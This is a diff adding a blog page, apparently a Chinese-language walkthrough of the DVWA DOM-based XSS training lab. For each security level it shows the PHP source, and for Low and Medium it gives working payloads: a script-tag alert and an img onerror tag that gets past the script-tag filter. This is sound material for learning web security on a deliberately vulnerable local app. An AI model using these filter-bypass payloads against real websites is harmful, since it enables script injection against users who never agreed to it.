@@ -1,0 +1,44 @@
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php
+
+# No protections, anything goes
+
+?&gt; </code></pre><p>没有经过任何过滤，可以直接注入</p>
+<pre><code>127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php
+
+// Is there any input?
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {
+    $default = $_GET[&apos;default&apos;];
+
+    # Do not allow script tags
+    if (stripos ($default, &quot;&lt;script&quot;) !== false) {
+        header (&quot;location: ?default=English&quot;);
+        exit;
+    }
+}
+
+?</code></pre><p>过滤了<script>,但我们可以借助其他标签</p>
+<pre><code>127.0.0.1/dvwa/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code></pre><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php
+
+// Is there any input?
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {
+
+    # White list the allowable languages
+    switch ($_GET[&apos;default&apos;]) {
+        case &quot;French&quot;:
+        case &quot;English&quot;:
+        case &quot;German&quot;:
+        case &quot;Spanish&quot;:
+            # ok
+            break;
+        default:
+            header (&quot;location: ?default=English&quot;);
+            exit;
+    }
+}
+
+?&gt; </code></pre><p>只能从三种语言选一种，暂时不太好注入</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php
+
+# Don&apos;t need to do anything, protction handled on the client side
+
+?&gt; </code></pre>
